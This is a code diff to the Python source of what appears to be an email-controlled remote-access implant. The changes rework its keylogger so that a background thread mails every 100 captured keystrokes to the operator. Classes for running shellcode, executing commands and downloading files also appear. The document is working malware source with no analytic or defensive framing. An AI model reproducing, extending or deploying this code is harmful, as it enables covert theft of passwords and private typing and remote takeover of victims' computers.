@@ -95,12 +95,16 @@ class KeyLogger(threading.Thread):
         self.jobid = None
         self.key_buffer = ''
 
-        self.setDaemon(True)
+        self.daemon = True
 
     def run(self):
         #logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
-        t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger started'}, self.jobid,))
-        t.start()
+        t1 = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger started'}, self.jobid,))
+        t2 = threading.Thread(name='watchKeys', target=self.watchKeys)
+        
+        for t in [t1, t2]:
+            t.setDaemon(True)
+            t.start()
 
         while True:
             hm = pyHook.HookManager() 
@@ -111,8 +115,19 @@ class KeyLogger(threading.Thread):
     def stop(self):
         #logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
         t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger stopped'}, self.jobid,))
+        t.setDaemon(True)
         t.start()
-        self.join()
+
+    def watchKeys(self):
+        while True:
+            if len(self.key_buffer) >= 100:
+                keys = self.key_buffer
+                t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': r'{}'.format(keys)}, self.jobid,))
+                t.setDaemon(True)
+                t.start()
+                self.key_buffer = ''
+            
+            time.sleep(0.5)
 
     def onKeyboardEvent(self, event):
         if event.Ascii != 0 or 8:
@@ -120,13 +135,6 @@ class KeyLogger(threading.Thread):
         
         if event.Ascii == 13:
             self.key_buffer += chr(event.Ascii)
-
-        if len(self.key_buffer) is 100:
-            #logging.debug("[keylogger] Resetting key_buffer")
-            #t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid,))
-            #t.start()
-            sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid)
-            self.key_buffer = ''
 
 class download(threading.Thread):
 
@@ -216,7 +224,6 @@ class execShellcode(threading.Thread):
             
             ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
-            sendEmail({"CMD": 'execshellcode', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
             #if verbose == True: print_exc()
             pass
@@ -244,7 +251,6 @@ class execCmd(threading.Thread):
 
 def sendEmail(text, jobid='', attachment=[], checkin=False):
     sub_header = uniqueid
-    print uniqueid, jobid
     if jobid:
         sub_header = 'imp:{}:{}'.format(uniqueid, jobid)
     elif checkin:
